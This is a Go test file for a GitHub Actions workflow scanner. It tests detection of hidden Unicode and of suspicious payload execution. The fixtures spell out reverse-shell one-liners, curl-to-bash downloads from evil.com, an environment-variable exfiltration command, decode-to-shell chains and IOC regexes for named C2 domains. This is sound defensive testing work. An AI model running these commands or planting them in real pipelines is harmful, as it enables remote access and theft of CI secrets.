package rules

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	runnerguard "github.com/Vigilant-LLC/runner-guard/v3"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/Vigilant-LLC/runner-guard/v3/internal/parser"
)

// ---------------------------------------------------------------------------
// scanBytesForSuspiciousUnicode unit tests
// ---------------------------------------------------------------------------

func TestScanBytes_DetectsZeroWidthSpace(t *testing.T) {
	// 5 zero-width spaces (U+200B = 0xE2 0x80 0x8B in UTF-8)
	data := []byte("name: CI\n" +
		"on: push\n" +
		"jobs:\n" +
		"  build:\n" +
		"    runs-on: ubuntu-latest\n" +
		"    steps:\n" +
		"      - run: echo \xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b hello\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "expected suspicious Unicode to be detected")
	assert.Equal(t, 5, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "zero-width space")
}

func TestScanBytes_DetectsVariationSelectors(t *testing.T) {
	// 4 variation selectors (U+FE00 = 0xEF 0xB8 0x80 in UTF-8)
	data := []byte("run: echo test\xef\xb8\x80\xef\xb8\x80\xef\xb8\x80\xef\xb8\x80\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "expected variation selectors to be detected")
	assert.Equal(t, 4, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "variation selector")
}

func TestScanBytes_DetectsTagCharacters(t *testing.T) {
	// 3 tag characters (U+E0001 = 0xF3 0xA0 0x80 0x81 in UTF-8)
	data := []byte("run: echo\xf3\xa0\x80\x81\xf3\xa0\x80\x82\xf3\xa0\x80\x83 test\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "expected tag characters to be detected")
	assert.Equal(t, 3, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "tag character")
}

func TestScanBytes_DetectsSupplementaryVariationSelectors(t *testing.T) {
	// 3 supplementary variation selectors (U+E0100 = 0xF3 0xA0 0x84 0x80)
	data := []byte("run: echo\xf3\xa0\x84\x80\xf3\xa0\x84\x80\xf3\xa0\x84\x80 test\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "expected supplementary variation selectors to be detected")
	assert.Equal(t, 3, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "supplementary variation selector")
}

func TestScanBytes_IgnoresFE0FAfterEmoji(t *testing.T) {
	// U+FE0F (Variation Selector 16) after emoji base characters is standard
	// emoji presentation — NOT steganography. These should be ignored.
	// ⚠️ = U+26A0 + U+FE0F, ✅ = U+2705 + U+FE0F, ⚙️ = U+2699 + U+FE0F, 🛠️ = U+1F6E0 + U+FE0F
	data := []byte("name: CI\n" +
		"on: push\n" +
		"jobs:\n" +
		"  build:\n" +
		"    runs-on: ubuntu-latest\n" +
		"    steps:\n" +
		"      - name: Build \xe2\x9a\xa0\xef\xb8\x8f\n" + // ⚠️
		"        run: echo \xe2\x9c\x85\xef\xb8\x8f done\n" + // ✅ (U+2705 is in Dingbats)
		"      - name: Config \xe2\x9a\x99\xef\xb8\x8f\n" + // ⚙️
		"        run: echo \xf0\x9f\x9b\xa0\xef\xb8\x8f tools\n") // 🛠️

	result := scanBytesForSuspiciousUnicode(data, 1)
	assert.Nil(t, result, "FE0F after emoji base characters should not be flagged")
}

func TestScanBytes_IgnoresFE0FAfterInfoAndWastebasket(t *testing.T) {
	// Real-world case: clash-verge-rev uses ℹ️ (U+2139+FE0F) and 🗑️ (U+1F5D1+FE0F)
	// in workflow echo statements. These must not be flagged.
	data := []byte("run: |\n" +
		"  echo \"\xe2\x84\xb9\xef\xb8\x8f  No assets found\"\n" + // ℹ️ (U+2139+FE0F)
		"  echo \"\xf0\x9f\x97\x91\xef\xb8\x8f  Assets to delete:\"\n" + // 🗑️ (U+1F5D1+FE0F)
		"  echo \"\xe2\x84\xb9\xef\xb8\x8f  No old assets\"\n" + // ℹ️
		"  echo \"\xf0\x9f\x97\x91\xef\xb8\x8f  Deleting old assets\"\n") // 🗑️

	result := scanBytesForSuspiciousUnicode(data, 1)
	assert.Nil(t, result, "FE0F after ℹ and 🗑 should not be flagged")
}

func TestScanBytes_FlagsFE0FWithoutEmoji(t *testing.T) {
	// U+FE0F NOT preceded by an emoji base should still be flagged as suspicious.
	// 3× FE0F after ASCII 'a' (not an emoji base).
	data := []byte("run: echo a\xef\xb8\x8fa\xef\xb8\x8fa\xef\xb8\x8f test\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "FE0F after non-emoji characters should be flagged")
	assert.Equal(t, 3, result.TotalCount)
	assert.Contains(t, result.CategoryMap, "variation selector")
}

func TestScanBytes_MixedEmojiAndSuspiciousFE0F(t *testing.T) {
	// Mix: 2 legitimate FE0F after emoji + 3 suspicious FE0F after ASCII.
	// Only the 3 suspicious ones should be counted.
	data := []byte("name: \xe2\x9a\xa0\xef\xb8\x8f\xe2\x9c\x85\xef\xb8\x8f\n" + // ⚠️✅ (legitimate)
		"run: echo x\xef\xb8\x8fy\xef\xb8\x8fz\xef\xb8\x8f\n") // x️y️z️ (suspicious)

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "suspicious FE0F should still be detected alongside legitimate emoji")
	assert.Equal(t, 3, result.TotalCount, "only non-emoji FE0F should be counted")
}

func TestScanBytes_IgnoresFE0EAfterEmoji(t *testing.T) {
	// Real-world case: coolify uses ⏱︎ (U+23F1+FE0E) in workflow labels.
	// FE0E is the text presentation selector — equally legitimate as FE0F.
	data := []byte("stale-issue-label: '\xe2\x8f\xb1\xef\xb8\x8e Stale'\n" + // ⏱︎ (U+23F1+FE0E)
		"stale-pr-label: '\xe2\x8f\xb1\xef\xb8\x8e Stale'\n" + // ⏱︎
		"labels-to-remove: '\xe2\x8f\xb1\xef\xb8\x8e Stale'\n") // ⏱︎

	result := scanBytesForSuspiciousUnicode(data, 1)
	assert.Nil(t, result, "FE0E after emoji base should not be flagged")
}

func TestScanBytes_FlagsFE0EWithoutEmoji(t *testing.T) {
	// FE0E after non-emoji characters should still be flagged.
	data := []byte("run: echo a\xef\xb8\x8ea\xef\xb8\x8ea\xef\xb8\x8e test\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "FE0E after non-emoji characters should be flagged")
	assert.Equal(t, 3, result.TotalCount)
}

func TestScanBytes_IgnoresBOMAtPosition0(t *testing.T) {
	// BOM at position 0 should be ignored; only BOM elsewhere is suspicious
	data := []byte("\xef\xbb\xbfname: CI\non: push\n")

	result := scanBytesForSuspiciousUnicode(data, 1)
	assert.Nil(t, result, "BOM at position 0 should not be flagged")
}

func TestScanBytes_FlagsBOMNotAtPosition0(t *testing.T) {
	// BOM not at position 0 should be flagged
	data := []byte("name: CI\n\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbfon: push\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result, "BOM not at position 0 should be flagged")
	assert.Contains(t, result.CategoryMap, "byte order mark (not at file start)")
}

func TestScanBytes_CleanFile(t *testing.T) {
	data := []byte("name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hello\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	assert.Nil(t, result, "clean file should not trigger detection")
}

func TestScanBytes_BelowThreshold(t *testing.T) {
	// Only 2 zero-width spaces, below threshold of 3
	data := []byte("run: echo \xe2\x80\x8b\xe2\x80\x8b hello\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	assert.Nil(t, result, "count below threshold should not trigger")
}

func TestScanBytes_TracksLineNumbers(t *testing.T) {
	data := []byte("line1\nline2\nline3 \xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b here\n")

	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result)
	assert.Equal(t, 3, result.FirstLine, "should report line 3")
}

func TestFormatScanResult(t *testing.T) {
	data := []byte("run: echo \xef\xb8\x80\xef\xb8\x80\xef\xb8\x80 test\n")
	result := scanBytesForSuspiciousUnicode(data, 3)
	require.NotNil(t, result)

	formatted := formatScanResult(result, " in workflow file")
	assert.Contains(t, formatted, "3 invisible Unicode characters detected in workflow file")
	assert.Contains(t, formatted, "variation selector")
}

// ---------------------------------------------------------------------------
// RGS-016: Unicode Steganography in Workflow File
// ---------------------------------------------------------------------------

func TestRGS016_WorkflowWithInvisibleUnicode(t *testing.T) {
	// Build YAML with embedded zero-width spaces in the run block.
	yamlContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b hello\n"

	wf, err := parser.ParseBytes([]byte(yamlContent), ".github/workflows/ci.yml")
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs016 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-016" {
			rgs016 = append(rgs016, f)
		}
	}

	require.NotEmpty(t, rgs016, "expected RGS-016 finding for invisible Unicode")
	assert.Equal(t, "critical", rgs016[0].Severity)
	assert.Contains(t, rgs016[0].Evidence, "invisible Unicode characters detected")
}

func TestRGS016_CleanWorkflow(t *testing.T) {
	yamlContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hello\n"

	wf, err := parser.ParseBytes([]byte(yamlContent), ".github/workflows/ci.yml")
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	for _, f := range findings {
		assert.NotEqual(t, "RGS-016", f.RuleID, "clean workflow should not trigger RGS-016")
	}
}

// ---------------------------------------------------------------------------
// RGS-017: Unicode Steganography in Referenced Script
// ---------------------------------------------------------------------------

func TestRGS017_ReferencedSetupPyWithUnicode(t *testing.T) {
	// Create a temp directory mimicking a repo structure.
	tmpDir := t.TempDir()
	ghDir := filepath.Join(tmpDir, ".github", "workflows")
	require.NoError(t, os.MkdirAll(ghDir, 0o755))

	// Write a setup.py with invisible Unicode.
	setupContent := "from setuptools import setup\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\nsetup(name='test')\n"
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "setup.py"), []byte(setupContent), 0o644))

	// Write a workflow that runs pip install.
	wfPath := filepath.Join(ghDir, "ci.yml")
	wfContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install .\n"
	require.NoError(t, os.WriteFile(wfPath, []byte(wfContent), 0o644))

	wf, err := parser.ParseFile(wfPath)
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs017 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-017" {
			rgs017 = append(rgs017, f)
		}
	}

	require.NotEmpty(t, rgs017, "expected RGS-017 finding for setup.py with Unicode")
	assert.Equal(t, "high", rgs017[0].Severity)
	assert.Contains(t, rgs017[0].Evidence, "setup.py")
}

func TestRGS017_CleanReferencedFile(t *testing.T) {
	tmpDir := t.TempDir()
	ghDir := filepath.Join(tmpDir, ".github", "workflows")
	require.NoError(t, os.MkdirAll(ghDir, 0o755))

	// Clean setup.py.
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "setup.py"),
		[]byte("from setuptools import setup\nsetup(name='test')\n"), 0o644))

	wfPath := filepath.Join(ghDir, "ci.yml")
	wfContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install .\n"
	require.NoError(t, os.WriteFile(wfPath, []byte(wfContent), 0o644))

	wf, err := parser.ParseFile(wfPath)
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	for _, f := range findings {
		assert.NotEqual(t, "RGS-017", f.RuleID, "clean setup.py should not trigger RGS-017")
	}
}

func TestRGS017_LocalActionWithUnicode(t *testing.T) {
	tmpDir := t.TempDir()
	ghDir := filepath.Join(tmpDir, ".github", "workflows")
	actionDir := filepath.Join(tmpDir, ".github", "actions", "my-action")
	require.NoError(t, os.MkdirAll(ghDir, 0o755))
	require.NoError(t, os.MkdirAll(actionDir, 0o755))

	// action.yml with invisible Unicode.
	actionContent := "name: My Action\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\xe2\x80\x8b\ndescription: test\nruns:\n  using: node20\n  main: index.js\n"
	require.NoError(t, os.WriteFile(filepath.Join(actionDir, "action.yml"), []byte(actionContent), 0o644))

	wfPath := filepath.Join(ghDir, "ci.yml")
	wfContent := "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/my-action\n"
	require.NoError(t, os.WriteFile(wfPath, []byte(wfContent), 0o644))

	wf, err := parser.ParseFile(wfPath)
	require.NoError(t, err)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs017 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-017" {
			rgs017 = append(rgs017, f)
		}
	}

	require.NotEmpty(t, rgs017, "expected RGS-017 finding for local action.yml with Unicode")
	assert.Contains(t, rgs017[0].Evidence, "action.yml")
}

// ---------------------------------------------------------------------------
// RGS-018: Suspicious Payload Execution Pattern
// ---------------------------------------------------------------------------

func TestRGS018_PythonEvalBase64(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: python -c "eval(base64.b64decode('aW1wb3J0IG9z'))"
`)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}

	require.NotEmpty(t, rgs018, "expected RGS-018 for eval+base64 pattern")
	assert.Contains(t, rgs018[0].Evidence, "Python eval+decode")
}

func TestRGS018_Base64PipeToShell(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "aW1wb3J0IG9z" | base64 --decode | bash
`)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}

	require.NotEmpty(t, rgs018, "expected RGS-018 for base64 decode piped to shell")
	assert.Contains(t, rgs018[0].Evidence, "base64 decode piped to shell")
}

func TestRGS018_KnownIOCVariable(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: export lzcdrtfxyqiplpd=$(curl -s http://evil.com/payload)
`)

	engine := NewEngineWithDefaults()
	// Manually add the signature since NewEngineWithDefaults doesn't load signatures.yaml.
	engine.signatures = []*ThreatSignature{
		{
			ID:          "glassworm-marker-variable",
			ThreatActor: "GlassWorm",
			Description: "Known GlassWorm malware marker variable",
			compiled:    regexp.MustCompile(`\blzcdrtfxyqiplpd\b`),
		},
	}

	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}

	require.NotEmpty(t, rgs018, "expected RGS-018 for known IOC variable")
	assert.Contains(t, rgs018[0].Evidence, "GlassWorm")
}

func TestRGS018_CleanBuildScript(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          npm install
          npm run build
          npm test
`)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	for _, f := range findings {
		assert.NotEqual(t, "RGS-018", f.RuleID, "normal build commands should not trigger RGS-018")
	}
}

func TestRGS018_JSEvalFromCharCode(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: node -e "var s = String.fromCharCode(72,101,108); eval(s)"
`)

	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})

	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}

	require.NotEmpty(t, rgs018, "expected RGS-018 for JS eval of fromCharCode")
}

func TestRGS018_ReverseShell(t *testing.T) {
	cases := []struct {
		name    string
		run     string
		wantStr string
	}{
		{"bash /dev/tcp", `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, "Bash reverse shell"},
		{"netcat exec", `nc -e /bin/sh 10.0.0.1 4444`, "Netcat reverse shell"},
		{"mkfifo pipe", `mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f`, "Named pipe reverse shell"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			wf := mustParseWorkflow(t, ".github/workflows/ci.yml", fmt.Sprintf(`
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: %s
`, tc.run))
			engine := NewEngineWithDefaults()
			findings := engine.Evaluate([]*parser.Workflow{wf})
			var rgs018 []Finding
			for _, f := range findings {
				if f.RuleID == "RGS-018" {
					rgs018 = append(rgs018, f)
				}
			}
			require.NotEmpty(t, rgs018, "expected RGS-018 for %s", tc.name)
			assert.Contains(t, rgs018[0].Evidence, tc.wantStr)
		})
	}
}

func TestRGS018_CurlPipeToShell(t *testing.T) {
	cases := []struct {
		name    string
		run     string
		wantStr string
	}{
		{"curl pipe bash", `curl -s https://evil.com/install.sh | bash`, "curl piped to shell"},
		{"wget pipe bash", `wget -O- https://evil.com/payload | bash`, "wget piped to shell"},
		{"curl pipe python", `curl https://evil.com/script.py | python3`, "curl piped to Python"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			wf := mustParseWorkflow(t, ".github/workflows/ci.yml", fmt.Sprintf(`
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: %s
`, tc.run))
			engine := NewEngineWithDefaults()
			findings := engine.Evaluate([]*parser.Workflow{wf})
			var rgs018 []Finding
			for _, f := range findings {
				if f.RuleID == "RGS-018" {
					rgs018 = append(rgs018, f)
				}
			}
			require.NotEmpty(t, rgs018, "expected RGS-018 for %s", tc.name)
			assert.Contains(t, rgs018[0].Evidence, tc.wantStr)
		})
	}
}

func TestRGS018_PowerShellEncoded(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: powershell -EncodedCommand ZQBjAGgAbwAgACIASABlAGwAbABvACIA
`)
	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})
	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}
	require.NotEmpty(t, rgs018, "expected RGS-018 for PowerShell encoded command")
	assert.Contains(t, rgs018[0].Evidence, "PowerShell encoded")
}

func TestRGS018_PythonExecCompress(t *testing.T) {
	cases := []struct {
		name    string
		run     string
		wantStr string
	}{
		{"exec compile", `python3 -c "exec(compile(open('payload.py').read(),'<string>','exec'))"`, "exec(compile("},
		{"exec zlib", `python3 -c "exec(zlib.decompress(b'...'))"`, "exec(zlib.decompress("},
		{"dynamic zlib", `python3 -c "__import__('zlib').decompress(b'...')"`, "dynamic zlib import"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			wf := mustParseWorkflow(t, ".github/workflows/ci.yml", fmt.Sprintf(`
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: %s
`, tc.run))
			engine := NewEngineWithDefaults()
			findings := engine.Evaluate([]*parser.Workflow{wf})
			var rgs018 []Finding
			for _, f := range findings {
				if f.RuleID == "RGS-018" {
					rgs018 = append(rgs018, f)
				}
			}
			require.NotEmpty(t, rgs018, "expected RGS-018 for %s", tc.name)
			assert.Contains(t, rgs018[0].Evidence, tc.wantStr)
		})
	}
}

func TestRGS018_EnvExfiltration(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: env | curl -X POST -d @- https://evil.com/collect
`)
	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})
	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}
	require.NotEmpty(t, rgs018, "expected RGS-018 for env exfiltration")
	assert.Contains(t, rgs018[0].Evidence, "exfiltration")
}

func TestRGS018_HexDecode(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "6563686f2068656c6c6f" | xxd -r -p | bash
`)
	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})
	var rgs018 []Finding
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			rgs018 = append(rgs018, f)
		}
	}
	require.NotEmpty(t, rgs018, "expected RGS-018 for hex decode to shell")
	assert.Contains(t, rgs018[0].Evidence, "Hex decode")
}

func TestRGS018_CleanScriptsShouldNotTrigger(t *testing.T) {
	wf := mustParseWorkflow(t, ".github/workflows/ci.yml", `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          go build ./...
          go test ./...
          make install
          docker build -t myapp .
          curl -sSL https://install.python-poetry.org | python3 -
          pip install -r requirements.txt
`)
	engine := NewEngineWithDefaults()
	findings := engine.Evaluate([]*parser.Workflow{wf})
	for _, f := range findings {
		if f.RuleID == "RGS-018" {
			// The poetry install line uses curl | python which IS suspicious
			// and should trigger — that's a valid finding
			if !strings.Contains(f.Evidence, "curl piped to Python") {
				t.Errorf("unexpected RGS-018 finding: %s", f.Evidence)
			}
		}
	}
}

// ---------------------------------------------------------------------------
// resolveReferencedFiles unit tests
// ---------------------------------------------------------------------------

func TestResolveReferencedFiles_PipInstall(t *testing.T) {
	tmpDir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "setup.py"), []byte("setup()"), 0o644))
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "pyproject.toml"), []byte("[build]"), 0o644))

	wf := &parser.Workflow{
		Path: filepath.Join(tmpDir, ".github", "workflows", "ci.yml"),
		Jobs: map[string]*parser.Job{
			"build": {
				Steps: []*parser.Step{
					{Run: "pip install ."},
				},
			},
		},
	}

	files := resolveReferencedFiles(wf, tmpDir)
	assert.NotEmpty(t, files, "should resolve setup.py and/or pyproject.toml")
}

func TestResolveReferencedFiles_NpmInstall(t *testing.T) {
	tmpDir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(tmpDir, "package.json"), []byte("{}"), 0o644))

	wf := &parser.Workflow{
		Path: filepath.Join(tmpDir, ".github", "workflows", "ci.yml"),
		Jobs: map[string]*parser.Job{
			"build": {
				Steps: []*parser.Step{
					{Run: "npm install"},
				},
			},
		},
	}

	files := resolveReferencedFiles(wf, tmpDir)
	assert.NotEmpty(t, files, "should resolve package.json")
}

func TestResolveReferencedFiles_NoFiles(t *testing.T) {
	tmpDir := t.TempDir()

	wf := &parser.Workflow{
		Path: filepath.Join(tmpDir, ".github", "workflows", "ci.yml"),
		Jobs: map[string]*parser.Job{
			"build": {
				Steps: []*parser.Step{
					{Run: "echo hello"},
				},
			},
		},
	}

	files := resolveReferencedFiles(wf, tmpDir)
	assert.Empty(t, files, "should find no referenced files for echo command")
}

func TestRepoRootFromWorkflowPath(t *testing.T) {
	tests := []struct {
		path     string
		expected string
	}{
		{"/repo/.github/workflows/ci.yml", "/repo"},
		{"/home/user/project/.github/workflows/build.yaml", "/home/user/project"},
		{"/random/path/file.yml", ""},
	}

	for _, tt := range tests {
		result := repoRootFromWorkflowPath(tt.path)
		assert.Equal(t, tt.expected, result, "for path %s", tt.path)
	}
}

// ---------------------------------------------------------------------------
// Signature loading
// ---------------------------------------------------------------------------

func TestSignatureRegexCompilation(t *testing.T) {
	// Verify the GlassWorm IOC patterns compile and match correctly.
	patterns := []struct {
		pattern string
		input   string
		match   bool
	}{
		{`\blzcdrtfxyqiplpd\b`, "export lzcdrtfxyqiplpd=foo", true},
		{`\blzcdrtfxyqiplpd\b`, "echo hello world", false},
		{`~/init\.json`, "cat ~/init.json", true},
		{`~/node-v22`, "ls ~/node-v22.1.0/bin", true},
		{`(?i)solana.*memo|memo.*solana`, "query solana memo field", true},
	}

	for _, tt := range patterns {
		re, err := regexp.Compile(tt.pattern)
		require.NoError(t, err, "pattern %q should compile", tt.pattern)
		assert.Equal(t, tt.match, re.MatchString(tt.input),
			"pattern %q against %q", tt.pattern, tt.input)
	}
}

func TestSignatureRegexCompilation_TeamPCP(t *testing.T) {
	patterns := []struct {
		name    string
		pattern string
		input   string
		match   bool
	}{
		// C2 domains
		{"aqua typosquat", `(?i)scan\.aquasecur[ti]iy?\.org|aquasecur[ti]iy?\.org`, "curl scan.aquasecurtiy.org/payload", true},
		{"aqua typosquat no match", `(?i)scan\.aquasecur[ti]iy?\.org|aquasecur[ti]iy?\.org`, "curl aquasecurity.com/docs", false},
		{"checkmarx zone", `(?i)checkmarx\[?\.]?zone|checkmarx\.zone`, "exfil to checkmarx.zone", true},
		{"checkmarx zone defanged", `(?i)checkmarx\[?\.]?zone|checkmarx\.zone`, "exfil to checkmarx[.]zone", true},
		{"litellm c2", `(?i)models\.litellm\.cloud`, "curl models.litellm.cloud/api", true},
		{"telnyx c2 ip", `83\.142\.209\.203`, "wget http://83.142.209.203:8080/payload", true},

		// Behavioral
		{"tpcp archive", `(?i)tpcp\.tar\.gz|tpcp[-_]?archive|TeamPCP.*Cloud.*[Ss]tealer`, "tar czf tpcp.tar.gz /tmp/creds", true},
		{"proc mem read", `(?i)/proc/[0-9]+/mem|/proc/self/mem|Runner\.Worker.*mem|dump.*Runner\.Worker`, "cat /proc/1234/mem > dump", true},
		{"runner worker", `(?i)/proc/[0-9]+/mem|/proc/self/mem|Runner\.Worker.*mem|dump.*Runner\.Worker`, "dump Runner.Worker process memory", true},
		{"tag force push", `(?i)git\s+tag\s+-f|git\s+push\s+.*--force.*tags|git\s+push\s+--tags\s+--force`, "git push --tags --force origin", true},
		{"clean git tag", `(?i)git\s+tag\s+-f|git\s+push\s+.*--force.*tags|git\s+push\s+--tags\s+--force`, "git tag v1.0.0", false},
		{"github release exfil", `(?i)tpcp-docs.*release|gh\s+release\s+create.*tpcp`, "gh release create tpcp-v1 stolen-data.tar.gz", true},

		// Package
		{"compromised trivy", `(?i)trivy@0\.69\.4|trivy-action.*malicious|setup-trivy.*compromised`, "uses: aquasecurity/trivy-action@0.69.4", false},
	}

	for _, tt := range patterns {
		t.Run(tt.name, func(t *testing.T) {
			re, err := regexp.Compile(tt.pattern)
			require.NoError(t, err, "pattern %q should compile", tt.pattern)
			assert.Equal(t, tt.match, re.MatchString(tt.input),
				"pattern %q against %q", tt.pattern, tt.input)
		})
	}
}

func TestSignatureRegexCompilation_UNC1069(t *testing.T) {
	patterns := []struct {
		name    string
		pattern string
		input   string
		match   bool
	}{
		// C2 domain
		{"sfrclak domain", `(?i)sfrclak\[?\.]?com|sfrclak\.com`, "curl https://sfrclak.com:8000/collect", true},
		{"sfrclak defanged", `(?i)sfrclak\[?\.]?com|sfrclak\.com`, "block sfrclak[.]com at firewall", true},
		{"sfrclak no match", `(?i)sfrclak\[?\.]?com|sfrclak\.com`, "curl https://example.com", false},

		// Package
		{"plain-crypto-js", `(?i)\bplain-crypto-js\b|plain[-_]crypto[-_]js`, "npm install plain-crypto-js", true},
		{"plain-crypto-js in lockfile", `(?i)\bplain-crypto-js\b|plain[-_]crypto[-_]js`, "resolved plain-crypto-js@4.2.1", true},
		{"legit crypto-js", `(?i)\bplain-crypto-js\b|plain[-_]crypto[-_]js`, "npm install crypto-js", false},
		{"compromised axios 1", `(?i)axios@1\.14\.1|axios@0\.30\.4`, "axios@1.14.1 in package-lock.json", true},
		{"compromised axios 2", `(?i)axios@1\.14\.1|axios@0\.30\.4`, "axios@0.30.4 resolved", true},
		{"clean axios", `(?i)axios@1\.14\.1|axios@0\.30\.4`, "axios@1.14.0 installed", false},

		// Behavioral
		{"postinstall chain", `(?i)postinstall.*base64.*decode|base64.*decode.*tmp.*exec.*rm|base64.*decode.*temp.*exec.*del`, "postinstall script runs base64 decode to /tmp and exec", true},
		{"temp exec delete", `(?i)(mktemp|/tmp/|\\$TEMP|%TEMP%).*&&.*(sh\b|bash\b|powershell|pwsh).*&&.*(rm\s+-|del\s+|Remove-Item)`, "/tmp/payload && bash /tmp/payload && rm -f /tmp/payload", true},
		{"clean build", `(?i)postinstall.*base64.*decode|base64.*decode.*tmp.*exec.*rm|base64.*decode.*temp.*exec.*del`, "npm run build", false},
	}

	for _, tt := range patterns {
		t.Run(tt.name, func(t *testing.T) {
			re, err := regexp.Compile(tt.pattern)
			require.NoError(t, err, "pattern %q should compile", tt.pattern)
			assert.Equal(t, tt.match, re.MatchString(tt.input),
				"pattern %q against %q", tt.pattern, tt.input)
		})
	}
}

func TestSignatureRegexCompilation_Telnyx(t *testing.T) {
	patterns := []struct {
